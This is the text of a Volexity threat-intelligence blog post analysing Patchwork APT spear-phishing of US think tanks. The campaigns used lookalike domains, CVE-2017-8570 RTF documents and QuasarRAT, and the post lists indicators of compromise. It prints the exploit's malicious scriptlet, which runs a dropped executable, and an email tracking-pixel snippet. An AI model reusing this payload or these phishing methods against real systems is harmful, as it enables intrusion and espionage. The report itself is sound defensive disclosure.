{
    "title": "patchwork apt group targets us think tanks _ volexity",
    "text": "BLOG\nPatchwork APT Group Targets US Think Tanks\nJUNE 7, 2018\nby Matthew Meltzer, Sean Koessel, Steven Adair\n    \nIn March and April 2018, Volexity identified multiple spear phishing campaigns attributed to\nPatchwork, an Indian APT group also known as Dropping Elephant. This increase in threat activity\nwas consistent with other observations  documented over the last few months in blogs by 3 60\nThreat Intelligence Center analyzing attacks on Chinese organizations  and Trend Micro noting\ntargets in South Asia . From the attacks observed by Volexity, what is most notable is that\nPatchwork has pivoted its targeting and has launched attacks directly against US-based think tanks.\nVolexity has also found that, in addition to sending malware lures, the Patchwork threat actors are\nleveraging unique tracking links in their e-mails for the purpose of identifying which recipients\nopened their e-mail messages.\nIn three observed spear phishing campaigns, the threat actors leveraged domains and themes mimicking\nthose of well-known think tank organizations in the United States. The group lifted articles and themes from\nthe Council on Foreign Relations (CFR) , the Center for Strategic and International Studies (CSIS),  and the\nMercator Institute for China Studies (MERICS)  for use in their spear phishing lures and malicious Rich Text\nFormat (RTF) documents. Strangely, in one case, the threat actors also appear to have used a domain name\nsimilar to the Foreign Policy Research Institute (FPRI)  in a message purporting to be from CFR. Each of the\nspear phishing attacks contained links to .doc files, which were really RTF documents that attempt to exploit\nCVE-2017-8570 (Composite Moniker). The threat actors appear to have leveraged publicly available exploit\ncode that can be found on Github at the URL: https://github.com/rxwx/CVE-2017-8570. If the exploit is\nsuccessful, the threat actors will attempt to drop and execute QuasarRAT. Details of the malware and the\nassociated attacks are listed below.\nSpear Phishing Messages\nEach e-mail was sent from the attacker-controlled domain mailcenter.support. This domain was not only\nused to send the phishing e-mails, but also to track which targets opened the e-mail. Within each of the\nHTML-formatted messages, an embedded image tag is used to beacon home to the attacker’s domain,\ncontaining an unique identifier specific to the recipient.\n<img src=3D”hxxps://www.mailcenter.support/track/ <unique_32_byte_identifier> ” width=3D”0″\nheight=3D”0″ />\nWhile the use of e-mail recipient tracking, a linked RTF document, and a final payload (QuasarRAT variant)\nremained the same, certain elements differed across campaigns observed. Details on each of the messages\nare listed below.\nMessage 1:\nHeaders Received: by mailcenter.support\nSender China Policy Analysis <publications@chinapolicyanalysis.org>\nSubject Chinas Arctic Dream\nBody Content and images included within the e-mail body were a direct copy of the following CSIS\narticle:\nhttps://www.csis.org/analysis/chinas-arctic-dream\nNotes The hyperlinked text Download File of “China’s Arctic Dream”  within the e-mail body lead to\na malicious RTF document located at the URL\nhxxp://chinapolicyanalysis.org/Chinas_Arctic_Dream.doc .\nThe chinapolicyanalysis.org domain was used as the sender address, as well as the hosting\nlocation of the malicious RTF document.\nMessage 2:\nHeaders Received: by mailcenter.support\nSender Council on Foreign Relations <webprint@fprii.net>\nSubject The Four Traps China May Fall Into\nBody Content and images included within the e-mail body were a direct copy of the following CFR\narticle:\nhttps://www.cfr.org/blog/four-traps-china-may-fall\nNotes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL\nhxxp://fprii.net/The_Four_Traps_for_China.doc.\nThe fprii.net domain was used as the sender address, as well as the hosting location of the\nmalicious RTF document. The structure of the domain mimics the Foreign Policy Research\nInstitute (FPRI), whose actual domain is fpri.net.\nMessage 3:\nHeaders Received: by mailcenter.support\nSender Mercator Institute for China Studies <publications@mericcs.org>\nSubject Authoritarian advance Responding to Chinas growing political influence in Europe\nBody Content and images included within the e-mail body were a direct copy of the following MERICS\nreport:\nhttps://www.merics.org/sites/default/files/2018-\n02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf\nNotes The hyperlinked text Click here to download the report  within the e-mail body lead to a\nmalicious RTF document located at the URL\nhxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc.\n \nThe mericcs.org domain was used as the sender address, as well as the hosting location of the\nmalicious RTF document. The structure of the domain mimics the Mercator Institute for China\nStudies (MERICS), whose actual domain is merics.org.\nSample Message\nThe image below shows an example of how the spear phishing message would look to a recipient.\nExploitation and Malware Execution\nUpon opening the above attachments, the recipient will be presented with a document that is a direct copy\nof a blog post or report released by the think tank organization being impersonated. At first glance,\neverything might look legitimate, but in the background the target user has likely just been infected with\nQuasarRAT. QuasarRAT is a freely available “remote (administration|access) tool” (RAT) written in C# and\ndistributed via Github. This RAT provides a variety of functionality that makes it particularly attractive to an\nattacker. This includes, but is not limited to, the following:\nAES encryption of network communication\nFile management\nFunctionality to download, upload, and execute files\nKeylogging\nRemote desktop access\nRemote webcam viewing\nReverse proxy\nBrowser and FTP client password recovery\nThe images below are what a target user opening a malicious RTF document would see from within\nMicrosoft Word.\nWhen the malicious RTF document is opened, two things happen that allow the attacker malware to run.\nFirst, the “ packager trick ” is leveraged in order to embed the initial QuasarRAT dropper (qrat.exe) in the\nmalicious RTF document. Its called the “packager trick” because any file embedded in an RTF file using\npackager will be automatically dropped to the %tmp% folder (c:\\Users\\%username%\\AppData\\Local\\Temp)\nwhen the RTF document is opened. Second, the threat actors exploit CVE-2017-8570 to achieve code\nexecution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document.\nThe contents of the malicious scriptlet file (displayed below) clearly show the threat actor executing the initial\n“qrat.exe” dropper from the current user’s %tmp% directory.\nNote: The scriptlet code is an exact match to that shown on the Github page referenced earlier for CVE-2017-\n8570 . The string “fjzmpcjvqp” is unique and not something likely to be present if the code was not generated\nwith the same public POC exploit code.\n<?XML version=”1.0″?>\n<scriptlet>\n<registration description=”fjzmpcjvqp”\nprogid=”fjzmpcjvqp”\nversion=”1.00″\nclassid=”{204774CF-D251-4F02-855B-2BE70585184B}”\nremotable=”true” >\n</registration>\n<script language=”JScript”>\n<![CDATA[\nvar r = new ActiveXObject(“WScript.Shell”).Run(“cmd /c %tmp%\\\\qrat.exe”,0,false);\nexit();\n]]>\n</script>\n</scriptlet>\nAfter the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in\nC:\\Users\\%username%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0  and\nunpacks/drops the final QuasarRAT binary named microsoft_network.exe.\nThe malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on\nWindows systems. The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from\nAirVPN .\nThis DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe,\nallowing it to remain persistent after reboot.\nAs seen in the image above, the QuasarRAT scheduled task is named Microsoft_Security_Task and runs at\n12:00 AM each day. Once the task is triggered, it will then repeat every 5 minutes for 60 days. When\nexecuted, microsoft_network.exe will initiate a request to freegeoip.net  in order to determine the\ngeographical location of the infected host. Immediately following the request, the malware will begin to\nbeacon over an encrypted connection to the threat actor’s command and control domain  tautiaos.com\n(43.249.37.199) . Several related samples were identified and are included in the File Indicators section\nbelow.\nConclusion\nThe addition of US-based think tanks to the list of organizations in the crosshairs of Patchwork shows an\nincreasing diversity in the geographic regions being targeted. While there were a few peculiar components to\nsome of the spear phish messages, the campaigns and themes were strategically relevant to the\norganizations being targeted. The Patchwork threat actors also appear to have adopted a technique seen\nfrom other APT groups where they are now tracking the effectiveness of their campaigns by recording which\nrecipients have opened the phishing message. This information allows a threat actor to determine if their\nmessages were delivered, which users are more susceptible to opening them, and basic information\nregarding the target’s operating system and e-mail client (or browser). Finally, although the payload observed\nbeing delivered by Patchwork in these campaigns is a readily available open source RAT, it does allow for\nflexibility in interacting with compromised machines without needing to use custom malware. Volexity is\nactively tracking this group and the infrastructure currently in use for the benefit of its network security\nmonitoring and threat intelligence customers.\nFile Indicators\nSamples Observed from Spear Phishing Messages Above\nFilename Chinas_Arctic_Dream.doc\nFile Size 6587812 bytes\nMD5 598eeb6a18233023f3551097aa49b083\nSHA1 e9a46966f93fe15c22636a5033c61c725add8fa5\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.\nFilename The_Four_Traps_for_China.doc\nFile Size 4428595 bytes\nMD5 7659c41a30976d523bb0fbb8cde49094\nSHA1 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.\nFilename The_Four_Traps_for_China.doc\nFile Size 4428595 bytes\nMD5 7659c41a30976d523bb0fbb8cde49094\nSHA1 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe.\nFilename qrat.exe\nFile Size 1093120  bytes\nMD5 c05e5131b196f43e1d02ca5ccc48ec0e\nSHA1 f28c592833f234c619917b5c7d8974840a810247\nNotes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file\nMicrosoft.Win32.TaskScheduler.dll.\nFilename microsoft_network.exe\nFile Size 846336  bytes\nMD5 9e4c373003c6d8f6597f96fc3ff1f49c\nSHA1 b7319a5ccf605fb2ff7760130e212728bccad323\nNotes QuasarRAT file that beacons to hardcoded IP 43.249.37.199 and the domain tautiaos.com. File\nis dropped to\n \nC:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\nNetwork\\microsoft_network\\1.0.0.0\\microsoft_network.exe.\nFilename Microsoft.Win32.TaskScheduler.dll\nFile Size 204488 bytes\nMD5 6fa7fce844065ce9c605cbe713f3e170\nSHA1 2f7eaad80eab3e9dcc67a003968b35c227290c69\nNotes .NET Task Scheduler Managed Wrapper from https://github.com/dahall/taskschedule. The DLL\nis also digitally signed by a certificate from “AirVPN”.\nAdditional Observed Malware Files\nFilename Armed-Forces-Officers.doc\nFile Size 3226435 bytes\nMD5 89beb207e7095d237c4d25c4c6e17e97\nSHA1 15010f7cea913f2a36c56da7d73c2b9eb5a3878f\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops a Delphi RAT with the file\nname vsrss.exe.\nFilename Part-I.doc\nFile Size 11349102 bytes\nMD5 92942c54224cd462dd201ae11a560bb8\nSHA1 85a21624df2211af3daf05c86a3fbea8271059d3\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe. This\nis the same file described above.\nFilename Part-II.doc\nFile Size 10156713 bytes\nMD5 e32668e569362c96cc56db368b7e821e\nSHA1 dadc493abbe3e21610539e1d5a42f523626a6132\nNotes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-\naudio.exe. Upon execution it will be installed under the filename crome.exe.\nFilename vsrss.exe\nFile Size 446976 bytes\nMD5 5c3456d5932544b779fe814133344fdb\nSHA1 7ab750afb25457a81c27a98dc6dfd51c27e61b0e\nNotes Delphi RAT file that beacons to ebeijingcn.live.\nFilename mico-audio.exe, crome.exe\nFile Size 494592 bytes\nMD5 2d8e9fb75e6e816cad38189691e9c9c8\nSHA1 2b9a2d5b34b4d79fdfd6c7b861311b12d1627163\nNotes QuasarRAT binary that beacons to hardcoded IP 209.58.176.201 and domain sastind-cn.org.\nFile starts as mico-audio.exe and installs to\nC:\\Users\\%USERNAME%\\AppData\\Roaming\\google-chrome\\crome.exe.\nNetwork Indicators​\nHostname IP Address Notes\nmailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking.\nchinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to\nhost malicious documents.\nfprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to\nhost malicious documents.\nmericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to\nhost malicious documents.\ntautiaos.com 43.249.37.199 Command and control server observed from QuasarRAT\nmalware.\nsastind-cn.org 209.58.176.201 Command and control server observed from QuasarRAT\nmalware.\nebeijingcn.live 209.58.169.91 Command and control server observed from Delphi RAT\nmalware.\n \nAPT , PatchworkMicrosoft Exchange Control Panel\n(ECP) Vulnerability CVE-2020-0688\nExploited\nVulnerable Private Networks:\nCorporate VPNs Exploited in the\nWild\nDigital Crackdown: Large-Scale\nSurveillance and Exploitation of\nUyghurs\nActive Exploitation of Newly Patched\nColdFusion Vulnerability (CVE-2018-\n15961)\nMagecart Strikes Again: Newegg in\nthe Crosshairs\nMarch 2020\nSeptember 2019\nNovember 2018\nSeptember 2018\nAugust 2018\nJuly 2018\nJune 2018\nApril 2018\nNovember 2017\nJuly 2017\nMarch 2017\nNovember 2016\nOctober 2015\nJuly 2015\nJune 2015\nApril 2015\nOctober 2014\nSeptember 2014\ndigital surveillance  Japan  Scanning  Cisco\nelections  Afghanistan  vulnerabilities\nAPT  Drupal  Dukes  VPN spear phishing\nScanbox  China  exploits  Adobe Flash\ncrimeware  Hong Kong  Gh0st  javaSEARCH\nRECENT POSTS\nARCHIVES\nTAGS\n© 2020 Volexity. All Rights Reserved.About\nAbout UsContact\n11654 Plaza America Dr #774Connect\nREQUEST A DEMO  BREACH ASSISTANCE\nPRODUCTS SERVICES COMPANY BLOG CONTACT\nThis Website uses cookies, which are necessary to its functioning and required to achieve the purposes illustrated in our Cookie Policy . By clicking the button, you consent to our use of cookies. AGREE & CLOSE\n "
}